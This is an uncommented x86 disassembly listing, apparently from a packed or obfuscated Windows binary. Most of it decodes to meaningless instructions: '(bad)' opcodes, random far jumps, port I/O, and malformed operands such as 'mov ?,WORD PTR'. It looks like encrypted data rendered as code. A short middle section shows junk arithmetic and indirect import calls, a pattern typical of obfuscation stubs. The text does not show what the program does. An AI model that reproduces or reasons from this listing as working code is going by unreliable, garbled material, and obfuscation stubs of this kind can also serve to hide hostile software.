  402208:	sbb    BYTE PTR [esi+0x69181812],bl
  40220e:	nop
  40220f:	cmp    al,0x27
  402211:	xchg   edi,eax
  402212:	mov    ebx,0x763243b2
  402217:	jge    0x40220f
  402219:	lods   eax,DWORD PTR ds:[esi]
  40221a:	jb     0x4021f8
  40221c:	xchg   esi,eax
  40221d:	add    DWORD PTR [edx+0x16],0xfffffff0
  402221:	(bad)  
  402222:	aad    0x76
  402224:	es (bad) 
  402226:	iret   
  402227:	dec    edx
  402228:	loope  0x40225a
  40222a:	in     eax,dx
  40222b:	mov    ds:0x2da71cd1,al
  402230:	aaa    
  402231:	sbb    al,0x4b
  402233:	xor    BYTE PTR ds:0x3291ed54,dl
  402239:	bound  edx,QWORD PTR [ebx+0x10bf8879]
  40223f:	aas    
  402240:	sahf   
  402241:	dec    edi
  402242:	adc    ecx,DWORD PTR [ebx]
  402244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402245:	(bad)  
  402246:	mov    ebx,0xf0d41c96
  40224b:	pop    ss
  40224c:	xchg   edi,eax
  40224d:	dec    eax
  40224e:	sbb    esp,DWORD PTR [edx-0x4a9080e3]
  402254:	mov    edx,0x89691937
  402259:	scas   eax,DWORD PTR es:[edi]
  40225a:	sbb    edi,esp
  40225c:	jg     0x40229f
  40225e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40225f:	push   ebp
  402260:	les    esp,FWORD PTR [ebp-0x6f]
  402263:	mov    ebp,0x95385ed
  402268:	xchg   edx,eax
  402269:	sbb    edi,ebx
  40226b:	push   cs
  40226c:	rcr    BYTE PTR [esi],1
  40226e:	mov    edx,DWORD PTR [edi+0x30]
  402271:	pushf  
  402272:	enter  0xd806,0x41
  402276:	imul   edi,DWORD PTR ds:[edx],0xec16f898
  40227d:	pop    es
  40227e:	push   ecx
  40227f:	fst    QWORD PTR [esi]
  402281:	sub    bl,ah
  402283:	jg     0x402227
  402285:	inc    esp
  402286:	adc    esi,DWORD PTR [edx-0x7fe2e2f7]
  40228c:	(bad)  
  40228d:	jae    0x4022a9
  40228f:	jge    0x40228c
  402291:	out    dx,eax
  402292:	sbb    DWORD PTR [ebx],ebx
  402294:	inc    eax
  402295:	cmp    al,0x7a
  402297:	stos   BYTE PTR es:[edi],al
  402298:	daa    
  402299:	cwde   
  40229a:	pop    es
  40229b:	cli    
  40229c:	scas   al,BYTE PTR es:[edi]
  40229d:	cs dec esi
  40229f:	retf   0x2e9
  4022a2:	lock aam 0xc3
  4022a5:	cmc    
  4022a6:	out    0xa8,eax
  4022a8:	(bad)  
  4022a9:	les    eax,FWORD PTR [ebp-0x1fb231bd]
  4022af:	fistp  WORD PTR [esi]
  4022b1:	pop    es
  4022b2:	and    dl,bl
  4022b4:	call   0xa230:0x889bfb55
  4022bb:	lahf   
  4022bc:	ins    BYTE PTR es:[edi],dx
  4022bd:	push   ecx
  4022be:	les    edi,FWORD PTR [ebp-0x41]
  4022c1:	sbb    eax,0xe92a6902
  4022c6:	mov    fs,WORD PTR ds:0xae3a88fb
  4022cc:	adc    ebx,DWORD PTR [ecx-0x55]
  4022cf:	jmp    0x40230d
  4022d1:	imul   ebx,DWORD PTR [edi+0x4632c110],0xda5b6ca1
  4022db:	fdiv   DWORD PTR [eax]
  4022dd:	adc    DWORD PTR [edi+eiz*1+0x6a8a1793],ebp
  4022e4:	mov    al,0x98
  4022e6:	sbb    BYTE PTR [ebx+ecx*2],cl
  4022e9:	inc    ebx
  4022ea:	fs (bad) 
  4022ec:	leave  
  4022ed:	jg     0x4022b6
  4022ef:	arpl   WORD PTR [edx-0x4d],cx
  4022f2:	dec    edx
  4022f3:	leave  
  4022f4:	icebp  
  4022f5:	fisubr WORD PTR [esi-0x4898849]
  4022fb:	in     eax,0x5e
  4022fd:	clc    
  4022fe:	inc    esp
  4022ff:	fnstenv [edx]
  402301:	push   es
  402302:	ja     0x402290
  402304:	cmp    al,0xdb
  402306:	out    dx,al
  402307:	fmul   DWORD PTR [edx+0x3a]
  40230a:	inc    ebp
  40230b:	cmc    
  40230c:	fs neg eax
  40230f:	inc    ecx
  402310:	out    dx,eax
  402311:	fwait
  402312:	push   0xa2e9d3c1
  402317:	scas   eax,DWORD PTR es:[edi]
  402318:	pop    edi
  402319:	call   0x7cd274d5
  40231e:	sbb    al,0x4b
  402320:	ins    BYTE PTR es:[edi],dx
  402321:	mov    eax,ds:0xdfe9f4a3
  402326:	jle    0x4022b1
  402328:	mov    dh,0xa1
  40232a:	xor    DWORD PTR [edi+0x4dd8ec3a],eax
  402330:	nop
  402331:	add    bl,BYTE PTR [ecx-0x18]
  402334:	adc    eax,0x590cd755
  402339:	hlt    
  40233a:	add    al,0xe
  40233c:	bound  eax,QWORD PTR [edi+0x7ccef07b]
  402342:	push   cs
  402343:	xor    ebp,DWORD PTR ds:0x6d735838
  402349:	inc    ebx
  40234a:	out    dx,eax
  40234b:	sub    al,0xf7
  40234d:	(bad)  [eax+0x49]
  402350:	pop    ss
  402351:	repz mov WORD PTR [ebx],fs
  402354:	mov    ecx,0x3b9158ba
  402359:	in     al,0x49
  40235b:	xchg   ebx,eax
  40235c:	dec    ebp
  40235d:	lods   eax,DWORD PTR ds:[esi]
  40235e:	xor    eax,0x34d8ecf1
  402363:	sub    bh,ah
  402365:	jne    0x4023a3
  402367:	xchg   edx,eax
  402368:	cmp    al,0x4f
  40236a:	mov    ebp,0xcc708368
  40236f:	cld    
  402370:	sbb    al,0x6c
  402372:	(bad)  
  402373:	pop    ecx
  402374:	ins    BYTE PTR es:[edi],dx
  402375:	pop    ss
  402376:	cdq    
  402377:	xor    ebx,DWORD PTR [edi]
  402379:	lahf   
  40237a:	out    0xbb,eax
  40237c:	inc    esi
  40237d:	scas   eax,DWORD PTR es:[edi]
  40237e:	push   edx
  40237f:	jg     0x4023fe
  402381:	push   edi
  402382:	arpl   WORD PTR [edx+edx*1-0x547ccad8],sp
  402389:	ror    esi,0xc8
  40238c:	xlat   BYTE PTR ds:[ebx]
  40238d:	jbe    0x402336
  40238f:	or     eax,0x32f2e7e3
  402394:	push   esi
  402395:	fadd   QWORD PTR [ebx+0x129afb54]
  40239b:	or     eax,0x113f811a
  4023a0:	fwait
  4023a1:	test   BYTE PTR [ecx+0x3cbf34a1],bh
  4023a7:	dec    eax
  4023a8:	pop    eax
  4023a9:	scas   al,BYTE PTR es:[edi]
  4023aa:	inc    ax
  4023ac:	pop    ds
  4023ad:	ror    BYTE PTR [edi],cl
  4023af:	fild   WORD PTR [esi]
  4023b1:	js     0x40239d
  4023b3:	out    dx,eax
  4023b4:	sbb    BYTE PTR ds:[edi-0x798f8624],bh
  4023bb:	push   ecx
  4023bc:	cdq    
  4023bd:	pusha  
  4023be:	jo     0x4023df
  4023c0:	xor    BYTE PTR ds:0xf01d8f78,ah
  4023c6:	in     eax,0x99
  4023c8:	nop
  4023c9:	xor    ebx,DWORD PTR [esi+eiz*4-0x22f9e020]
  4023d0:	outs   dx,BYTE PTR ds:[esi]
  4023d1:	push   eax
  4023d2:	sub    esi,DWORD PTR [ecx-0x6b]
  4023d5:	loope  0x4023b9
  4023d7:	ja     0x4023f5
  4023d9:	(bad)  
  4023da:	(bad)  
  4023db:	jne    0x40241d
  4023dd:	aas    
  4023de:	push   ecx
  4023df:	push   esp
  4023e0:	js     0x402387
  4023e2:	inc    eax
  4023e3:	mov    edi,0xd4932c1a
  4023e8:	(bad)  
  4023e9:	test   DWORD PTR [esp+esi*1],0x6f0ee4d1
  4023f0:	sbb    ebx,DWORD PTR [esi]
  4023f2:	rcl    BYTE PTR [esi],1
  4023f4:	xchg   esp,eax
  4023f5:	retf   
  4023f6:	sub    al,0x44
  4023f8:	scas   eax,DWORD PTR es:[edi]
  4023f9:	xchg   esi,eax
  4023fa:	adc    BYTE PTR [edi-0x1d53bce6],al
  402400:	aaa    
  402401:	jae    0x4023a7
  402403:	pop    ecx
  402404:	ret    0xf094
  402407:	stc    
  402408:	lea    esi,[esi+edx*2-0xbb1e7ad]
  40240f:	jno    0x40248a
  402411:	outs   dx,DWORD PTR ds:[esi]
  402412:	xlat   BYTE PTR ds:[ebx]
  402413:	xor    al,0x42
  402415:	push   ecx
  402416:	loop   0x4023ea
  402418:	mov    ds:0xd97f90fe,al
  40241d:	and    eax,0x2a68b13d
  402422:	mov    ds,WORD PTR [eax+0x636e7a5f]
  402428:	out    0xaa,al
  40242a:	mov    dh,0x76
  40242c:	cdq    
  40242d:	sbb    DWORD PTR [ebp-0x17],0xffffffa8
  402431:	ds jl  0x40249c
  402434:	pop    esi
  402435:	and    esi,eax
  402437:	scas   eax,DWORD PTR es:[edi]
  402438:	test   ah,ah
  40243a:	(bad)  
  40243b:	sbb    ebx,DWORD PTR [esp+edi*8+0x62]
  40243f:	mul    edi
  402441:	inc    ebp
  402442:	ss int3 
  402444:	cwde   
  402445:	fldenv [edi+eiz*2]
  402448:	lds    edx,FWORD PTR [edx+eax*8]
  40244b:	sub    DWORD PTR [ebx+0x5d152dfe],0x3a4bb453
  402455:	xchg   eax,edx
  402457:	aas    
  402458:	adc    DWORD PTR [ebx+edx*1+0x7a893fd8],edi
  40245f:	xor    DWORD PTR [eax+0x73],ebp
  402462:	sahf   
  402463:	dec    ebp
  402464:	fmul   st,st(2)
  402466:	ins    DWORD PTR es:[edi],dx
  402467:	call   0xf7a6956a
  40246c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40246d:	lea    esp,[ecx]
  40246f:	cli    
  402470:	clc    
  402471:	ds pop eax
  402473:	(bad)  
  402474:	sbb    esi,DWORD PTR [edi-0x5e]
  402477:	xchg   edi,eax
  402478:	cli    
  402479:	es pop eax
  40247b:	sti    
  40247c:	ins    BYTE PTR es:[edi],dx
  40247d:	jl     0x402443
  40247f:	sbb    dh,dl
  402481:	or     bh,0x62
  402484:	cmp    al,0x8c
  402486:	lea    ecx,[eax+0x65]
  402489:	sub    dh,BYTE PTR ds:0x90fd3342
  40248f:	mov    dl,0x91
  402491:	clc    
  402492:	enter  0x1946,0x46
  402496:	push   esi
  402497:	ds adc eax,0xa6beebcd
  40249d:	repnz pop edx
  40249f:	adc    bl,BYTE PTR [eax+0x3]
  4024a2:	cdq    
  4024a3:	xchg   edx,eax
  4024a4:	out    0xf0,al
  4024a6:	ret    0x9a1d
  4024a9:	pop    edi
  4024aa:	mov    dl,bh
  4024ac:	xor    dh,BYTE PTR [edi+ebp*4]
  4024af:	xchg   ecx,eax
  4024b0:	add    DWORD PTR [ecx+ebp*4],0x3e39a5c8
  4024b7:	xchg   BYTE PTR gs:[edx+0x76],bh
  4024bb:	enter  0xcc5e,0x96
  4024bf:	sub    al,dh
  4024c1:	inc    edx
  4024c2:	sbb    ch,BYTE PTR [ebx+0x30975f77]
  4024c8:	sub    edx,eax
  4024ca:	inc    esi
  4024cb:	fld    DWORD PTR [edi]
  4024cd:	fwait
  4024ce:	adc    DWORD PTR [esi-0x3a],esi
  4024d1:	mov    cs,WORD PTR [edx+0x1109f45b]
  4024d7:	cmp    BYTE PTR [esi-0x28dcf2cd],dh
  4024dd:	(bad)  
  4024df:	dec    edi
  4024e0:	in     al,0xdf
  4024e2:	(bad)  
  4024e3:	jb     0x402531
  4024e5:	pop    es
  4024e6:	stos   BYTE PTR es:[edi],al
  4024e7:	mov    DWORD PTR [ecx+0x11],ecx
  4024ea:	lock or DWORD PTR [eax],ebx
  4024ed:	in     al,0x8
  4024ef:	fadd   st(3),st
  4024f1:	and    DWORD PTR [esi+0x4c],esp
  4024f4:	lock sti 
  4024f6:	repz sub al,BYTE PTR [edx+0x28e68344]
  4024fd:	cdq    
  4024fe:	int3   
  4024ff:	pop    ss
  402500:	mov    WORD PTR [edi-0x3aa3908a],fs
  402506:	push   eax
  402507:	xor    al,0x19
  402509:	int3   
  40250a:	cmp    DWORD PTR [esi],0x38
  40250d:	sub    al,0x86
  40250f:	dec    ecx
  402510:	xchg   ebx,eax
  402511:	mov    ah,0xd7
  402513:	jae    0x402580
  402515:	mov    esi,0x3f75713d
  40251a:	fild   DWORD PTR [ebx-0x46]
  40251d:	push   esi
  40251e:	loopne 0x4024ed
  402520:	enter  0x386f,0xc0
  402524:	dec    edx
  402525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402526:	int    0xca
  402528:	jbe    0x4025a1
  40252a:	daa    
  40252b:	pop    ebx
  40252c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40252d:	mov    ds:0x8e566ba8,al
  402532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402533:	stos   BYTE PTR es:[edi],al
  402534:	in     al,dx
  402535:	cmp    al,0xed
  402537:	scas   al,BYTE PTR es:[edi]
  402538:	adc    DWORD PTR [edx+0x6e520d7f],eax
  40253e:	fxch   st(5)
  402540:	or     ah,BYTE PTR [eax+0x33]
  402543:	stos   DWORD PTR es:[edi],eax
  402544:	or     BYTE PTR [eax-0x325042b0],dl
  40254a:	test   eax,0x54a4b6de
  40254f:	cs cmp ah,al
  402552:	push   ebx
  402553:	push   0x5c896168
  402558:	ror    DWORD PTR [ebx],0x78
  40255b:	jmp    0x4025b4
  40255d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40255e:	sbb    DWORD PTR [edx-0x26],edi
  402561:	icebp  
  402562:	bound  esi,QWORD PTR [ebp+0x2e]
  402565:	mov    edx,0x77858ac1
  40256a:	mov    ecx,0x49e109d6
  40256f:	or     eax,0xea645447
  402574:	and    ebx,ecx
  402576:	daa    
  402577:	adc    ch,dl
  402579:	mov    bx,0xa764
  40257d:	stc    
  40257e:	js     0x402507
  402580:	adc    ebx,esp
  402582:	pop    esp
  402583:	cli    
  402584:	rol    DWORD PTR [edx-0x11],0xee
  402588:	arpl   ax,cx
  40258a:	stos   BYTE PTR es:[edi],al
  40258b:	push   edx
  40258c:	and    BYTE PTR [ecx],dl
  40258e:	cmp    cl,BYTE PTR [ecx-0x44]
  402591:	adc    BYTE PTR [ebp+0x54],cl
  402594:	xor    esp,0x971536c9
  40259a:	dec    edx
  40259b:	gs push esp
  40259d:	cmp    ebx,DWORD PTR [edx+0x5a]
  4025a0:	adc    al,0x46
  4025a2:	outs   dx,BYTE PTR ds:[esi]
  4025a3:	repz loopne 0x40255e
  4025a6:	shl    edx,0xc8
  4025a9:	add    al,0xe6
  4025ab:	adc    BYTE PTR [edi-0x3d3ecc4b],al
  4025b1:	test   DWORD PTR [edi],ebx
  4025b3:	add    DWORD PTR [edi+0x759ba062],0x6b05e23b
  4025bd:	shl    BYTE PTR [edx],cl
  4025bf:	lods   eax,DWORD PTR ds:[esi]
  4025c0:	mov    edx,0xb0cb64b0
  4025c5:	jno    0x402605
  4025c7:	jmp    0x402588
  4025c9:	test   al,0xd6
  4025cb:	adc    esi,DWORD PTR [ebp-0x22]
  4025ce:	mov    DWORD PTR [ebp-0x70],0x3b72
  4025d5:	movzx  eax,WORD PTR ds:0x4282bf
  4025dc:	adc    DWORD PTR ds:0x42814b,eax
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x428133,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x428127,0x0
  4025fd:	mov    DWORD PTR ds:0x4282d3,0x76b5
  402607:	mov    DWORD PTR ds:0x42812f,edx
  40260d:	mov    DWORD PTR ds:0x428247,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x428233
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x428127,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x4281ff
  402645:	call   DWORD PTR ds:0x428d5c
  40264b:	sbb    DWORD PTR ds:0x42834b,0x36f
  402655:	adc    DWORD PTR ds:0x4282cf,0x428157
  40265f:	sub    DWORD PTR ds:0x42833f,0x4282db
  402669:	and    DWORD PTR ds:0x42811f,0x42820b
  402673:	add    DWORD PTR ds:0x4282df,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x428127
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42811b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x42824f,0x0
  4026b7:	mov    DWORD PTR ds:0x4282af,edx
  4026bd:	mov    DWORD PTR ds:0x42820b,ecx
  4026c3:	mov    DWORD PTR ds:0x428133,edx
  4026c9:	mov    DWORD PTR ds:0x42822f,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42811b
  4026dd:	mov    DWORD PTR ds:0x42824f,edx
  4026e3:	cmp    DWORD PTR ds:0x42824f,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428d60
  402708:	add    DWORD PTR ds:0x428257,0x4282b7
  402712:	sub    DWORD PTR ds:0x4282d3,0x6e4a
  40271c:	xor    DWORD PTR ds:0x42812b,0x16a6
  402726:	dec    DWORD PTR ds:0x428147
  40272c:	and    DWORD PTR ds:0x42822b,edx
  402732:	or     DWORD PTR ds:0x4282bb,edx
  402738:	mov    eax,ds:0x42814f
  40273d:	and    DWORD PTR ds:0x428363,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x428363
  402751:	sbb    DWORD PTR ds:0x42822f,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42820f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x4282c3
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0xb1d731aa
  4027a0:	mov    al,0x30
  4027a2:	cld    
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    BYTE PTR [ecx],ah
  4027aa:	jecxz  0x402818
  4027ac:	xor    DWORD PTR [ebx+0x66],ebp
  4027af:	in     eax,dx
  4027b0:	jg     0x402798
  4027b2:	cdq    
  4027b3:	popa   
  4027b4:	xchg   esp,eax
  4027b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b6:	in     al,dx
  4027b7:	loop   0x40281b
  4027b9:	sbb    dh,bh
  4027bb:	xchg   ebp,eax
  4027bc:	sbb    ebx,DWORD PTR [edx+0x4]
  4027bf:	aam    0x7a
  4027c1:	inc    ebp
  4027c2:	mov    dh,al
  4027c4:	int3   
  4027c5:	leave  
  4027c6:	xchg   ecx,eax
  4027c7:	push   eax
  4027c8:	(bad)  
  4027ca:	jp     0x4027aa
  4027cc:	hlt    
  4027cd:	push   edx
  4027ce:	lock jge 0x402764
  4027d1:	jg     0x402838
  4027d3:	popa   
  4027d4:	and    al,0xd0
  4027d6:	jb     0x4027e1
  4027d8:	inc    ebp
  4027d9:	cmp    ebx,DWORD PTR [ecx+0xb]
  4027dc:	xor    eax,0x73ca2040
  4027e1:	ficomp DWORD PTR [edx]
  4027e3:	nop
  4027e4:	mov    edx,0xc1ae27c5
  4027e9:	add    DWORD PTR [ecx+0x6a09bb2d],esi
  4027ef:	loope  0x4027ba
  4027f1:	mov    gs,WORD PTR [esp+ecx*8-0x1fdafc2]
  4027f8:	adc    esi,eax
  4027fa:	xchg   ebp,eax
  4027fb:	pop    es
  4027fc:	jp     0x40282d
  4027fe:	mov    bh,0x6c
  402800:	mov    ebx,db7
  402803:	loopne 0x402831
  402805:	cmc    
  402806:	jp     0x402824
  402808:	xchg   edx,eax
  402809:	repnz dec ebx
  40280b:	dec    edi
  40280c:	sub    DWORD PTR [ebx+ecx*1+0x7],ebx
  402810:	mov    bl,0x4d
  402812:	mov    DWORD PTR [eax-0x152cb824],esi
  402818:	aam    0x7f
  40281a:	iret   
  40281b:	sahf   
  40281c:	jno    0x402863
  40281e:	test   eax,eax
  402820:	repnz popa 
  402822:	test   esi,ecx
  402824:	aaa    
  402825:	xor    eax,0x97c2fe85
  40282a:	cmp    eax,0xd08d2338
  40282f:	(bad)  
  402830:	push   cs
  402831:	push   ecx
  402832:	xor    edx,eax
  402834:	not    DWORD PTR [ebx+0x31]
  402837:	mov    dl,0x5
  402839:	or     esp,DWORD PTR [edx-0x2f15ab39]
  40283f:	sbb    DWORD PTR [esi-0x585b00cc],edx
  402845:	ja     0x40287f
  402847:	leave  
  402848:	sti    
  402849:	and    DWORD PTR [eax-0x13d0916],edx
  40284f:	fcmovnb st,st(1)
  402852:	xor    BYTE PTR [ecx],cl
  402854:	push   ds
  402855:	or     BYTE PTR [edx-0x38],ch
  402858:	(bad)  
  40285a:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40285c:	sbb    BYTE PTR [eax+0x12baa070],dl
  402862:	pop    ebx
  402863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402864:	xor    ah,BYTE PTR [esi-0x5b]
  402867:	mov    esi,0xb778c152
  40286c:	aam    0xae
  40286e:	aaa    
  40286f:	pop    ebp
  402870:	xchg   edx,eax
  402871:	shl    DWORD PTR [ecx+0x5440adb6],cl
  402877:	aas    
  402878:	cld    
  402879:	mov    eax,0xd08efee7
  40287e:	mov    esi,0x79e0ff6
  402883:	loop   0x4028ca
  402885:	test   BYTE PTR [ebx],ah
  402887:	and    al,0x78
  402889:	std    
  40288a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40288b:	jmp    0xf11d:0x4b2bbe68
  402892:	call   0x62cb15e0
  402897:	fcom   DWORD PTR [esi+0x69480b67]
  40289d:	rcl    BYTE PTR [eax+0x33],cl
  4028a0:	fcom   st(6)
  4028a2:	mov    ds:0x1d95760d,al
  4028a7:	cld    
  4028a8:	lods   al,BYTE PTR ds:[esi]
  4028a9:	mov    ecx,DWORD PTR [esi]
  4028ab:	sbb    al,0x1b
  4028ad:	inc    ecx
  4028ae:	mov    fs,ebx
  4028b0:	cmp    al,0x71
  4028b2:	enter  0x78a9,0x74
  4028b6:	imul   ecx,DWORD PTR [edx+0x1a],0x63d964ea
  4028bd:	shl    DWORD PTR [edx+0x46],0x71
  4028c1:	ss call 0xab06ebbd
  4028c7:	rol    BYTE PTR [edi+0x6ae4f4e4],cl
  4028cd:	xchg   ebp,eax
  4028ce:	push   ds
  4028cf:	retf   
  4028d0:	mov    ch,0xc8
  4028d2:	pop    ecx
  4028d3:	(bad)  
  4028d4:	rol    dh,cl
  4028d6:	aaa    
  4028d7:	and    al,0x8b
  4028d9:	mov    al,ds:0x75b2b6f5
  4028de:	test   edx,ecx
  4028e0:	out    0x40,eax
  4028e2:	sbb    eax,0x819878b4
  4028e7:	scas   eax,DWORD PTR es:[edi]
  4028e8:	push   ss
  4028e9:	xchg   esi,eax
  4028ea:	js     0x4028ee
  4028ec:	cli    
  4028ed:	test   eax,0x64457ef9
  4028f2:	dec    eax
  4028f3:	mov    ss,edx
  4028f5:	ds dec esi
  4028f7:	mov    cl,dh
  4028f9:	hlt    
  4028fa:	xor    al,0x10
  4028fc:	jbe    0x40288f
  4028fe:	imul   esi,esi,0xffffff9c
  402901:	dec    esp
  402902:	or     edi,ebx
  402904:	push   esi
  402905:	xchg   esi,eax
  402906:	jo     0x4028e9
  402908:	fwait
  402909:	inc    edi
  40290a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40290b:	sub    eax,0x61b86126
  402910:	scas   al,BYTE PTR es:[edi]
  402911:	loopne 0x40292e
  402913:	jno    0x402905
  402915:	mov    ah,0xda
  402917:	aaa    
  402918:	add    eax,0xa4a9a864
  40291d:	div    bl
  40291f:	inc    ebp
  402920:	add    BYTE PTR [ebp-0x57dacc4],bh
  402926:	neg    BYTE PTR [edi]
  402928:	cmp    al,0x86
  40292a:	out    dx,al
  40292b:	push   ecx
  40292c:	push   ds
  40292d:	cmp    eax,0x1805fe99
  402932:	xor    edi,ecx
  402934:	dec    esp
  402935:	fdiv   st(0),st
  402937:	(bad)  
  402938:	jg     0x402977
  40293a:	(bad)  
  40293b:	mov    ebp,ds
  40293d:	sahf   
  40293e:	js     0x402988
  402940:	sub    BYTE PTR [edi+0x1da60e96],dh
  402946:	jmp    0x2e56:0x7503dc2a
  40294d:	bound  esp,QWORD PTR [eax]
  40294f:	ins    BYTE PTR es:[edi],dx
  402950:	in     al,0x2
  402952:	sub    eax,0x19f62bed
  402957:	cmp    DWORD PTR [ecx+0x4ced1371],edi
  40295d:	add    DWORD PTR ds:0xc9824544,edx
  402964:	cli    
  402965:	mov    al,BYTE PTR [esi-0x7f]
  402968:	pop    ebx
  402969:	or     al,0xaf
  40296b:	(bad)  
  40296c:	rcr    BYTE PTR [eax-0x4bfba77b],0x28
  402973:	pop    eax
  402974:	sbb    eax,ebx
  402976:	lock fld DWORD PTR ss:[eax]
  40297a:	nop
  40297b:	rcl    DWORD PTR [edx-0x6e8bd98c],0x88
  402982:	push   es
  402983:	xchg   BYTE PTR [edx+0x7b56b6f1],dl
  402989:	in     eax,dx
  40298a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40298b:	or     eax,0xfde0bf20
  402990:	js     0x4029b0
  402992:	adc    dl,ah
  402994:	lea    edx,fs:[edx]
  402997:	xor    al,0x9
  402999:	clc    
  40299a:	jecxz  0x402925
  40299c:	cmp    BYTE PTR [edi-0x65],bl
  40299f:	iret   
  4029a0:	mov    bl,0x2c
  4029a2:	ins    BYTE PTR es:[edi],dx
  4029a3:	dec    esi
  4029a4:	fsub   DWORD PTR [ebp-0x10]
  4029a7:	xor    al,0xa
  4029a9:	fsubr  QWORD PTR [ecx-0x2]
  4029ac:	cld    
  4029ad:	inc    ebp
  4029ae:	mov    ebx,0xca5ac9bf
  4029b3:	in     eax,0xc9
  4029b5:	mov    ah,0xe6
  4029b7:	pop    ebp
  4029b8:	push   edi
  4029b9:	mov    bh,0x9f
  4029bb:	push   esi
  4029bc:	gs xchg edx,eax
  4029be:	repz in eax,dx
  4029c0:	inc    ebp
  4029c1:	shl    ecx,cl
  4029c3:	repz scas al,BYTE PTR es:[edi]
  4029c5:	or     ebx,eax
  4029c7:	inc    edx
  4029c8:	popf   
  4029c9:	(bad)  
  4029ca:	(bad)  
  4029cc:	xor    esp,DWORD PTR [ebx-0x2c4756cc]
  4029d2:	(bad)  
  4029d3:	call   0x485938de
  4029d8:	cmp    eax,0xd30d53
  4029dd:	mov    ecx,0x671e6a0a
  4029e2:	mov    ?,WORD PTR ds:0xd3842316
  4029e8:	aas    
  4029e9:	push   ebp
  4029ea:	cmp    cl,BYTE PTR [esi]
  4029ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029ed:	jmp    0x4029bd
  4029ef:	ss xchg edi,eax
  4029f1:	xchg   ebp,eax
  4029f2:	add    BYTE PTR [edx+0x47d44b59],cl
  4029f8:	jo     0x402997
  4029fa:	repz xchg esp,eax
  4029fc:	mov    al,ds:0xfa90284b
  402a01:	adc    ebx,DWORD PTR [edi+edx*2+0x1d]
  402a05:	sub    ah,ch
  402a07:	push   edi
  402a08:	or     bl,ch
  402a0a:	in     eax,0x9b
  402a0c:	arpl   WORD PTR [esi],bx
  402a0e:	sahf   
  402a0f:	cld    
  402a10:	cli    
  402a11:	mov    bl,0xae
  402a13:	xor    al,0x27
  402a15:	adc    BYTE PTR [ecx],0x24
  402a18:	rcr    cl,1
  402a1a:	jbe    0x402a67
  402a1c:	test   al,0x46
  402a1e:	imul   ebx,esi,0xe0f7e2e8
  402a24:	stos   DWORD PTR es:[edi],eax
  402a25:	xchg   ebp,eax
  402a26:	pushf  
  402a27:	ja     0x4029d5
  402a29:	in     al,0xec
  402a2b:	jecxz  0x402a51
  402a2d:	ja     0x402a06
  402a2f:	mov    BYTE PTR [ebx+0x738ae636],0x8e
  402a36:	(bad)  [ebx+0x728c22d]
  402a3c:	lds    esp,FWORD PTR [esi-0x397231a2]
  402a42:	shl    DWORD PTR [ecx-0x4b],cl
  402a45:	outs   dx,BYTE PTR ds:[esi]
  402a46:	pop    esp
  402a47:	outs   dx,BYTE PTR ds:[esi]
  402a48:	fiadd  WORD PTR [ebx+edi*2]
  402a4b:	sbb    edx,DWORD PTR [esi]
  402a4d:	leave  
  402a4e:	bound  esp,QWORD PTR [eax]
  402a50:	mov    cl,0xe3
  402a52:	pusha  
  402a53:	call   0x8321:0xa9b0b86c
  402a5a:	loopne 0x402a57
  402a5c:	fisub  WORD PTR [edi+0x35cf411d]
  402a62:	add    bh,dh
  402a64:	mov    ebp,0x2d38055e
  402a69:	inc    ebx
  402a6a:	or     BYTE PTR [edx],al
  402a6c:	test   BYTE PTR [eax+0x7b],ah
  402a6f:	lds    edi,FWORD PTR [edx]
  402a71:	sub    al,BYTE PTR [edx-0x5c]
  402a74:	das    
  402a75:	test   DWORD PTR [edi+0x11],edx
